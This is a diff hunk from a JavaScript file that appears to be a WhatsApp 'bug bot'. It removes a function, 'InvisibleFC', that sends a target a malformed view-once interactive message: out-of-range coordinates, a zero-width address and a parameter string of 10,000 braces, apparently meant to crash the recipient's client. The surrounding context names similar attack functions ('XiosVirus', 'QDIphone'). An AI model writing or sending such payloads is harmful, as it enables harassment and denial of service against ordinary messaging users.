@@ -2089,46 +2089,6 @@ async function XiosVirus(target, QBug) {
         }
       );
     }
-async function InvisibleFC(CosmoX, target) {
-  try {
-    let message = {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              title: "OTAX",
-              hasMediaAttachment: false,
-              locationMessage: {
-                degreesLatitude: -999.035,
-                degreesLongitude: 922.999999999999,
-                name: "OTAX",
-                address: "\u200D",
-              },
-            },
-            body: {
-              text: "OTAX",
-            },
-            nativeFlowMessage: {
-              messageParamsJson: "{".repeat(10000),
-            },
-            contextInfo: {
-              participant: target,
-              mentionedJid: ["0@s.whatsapp.net"],
-            },
-          },
-        },
-      },
-    };
-
-    await CosmoX.relayMessage(target, message, {
-      messageId: null,
-      participant: { jid: target },
-      userJid: target,
-    });
-  } catch (err) {
-    console.log(err);
-  }
-}
 async function QDIphone(target, QBug) {
       renz.relayMessage(
         target,
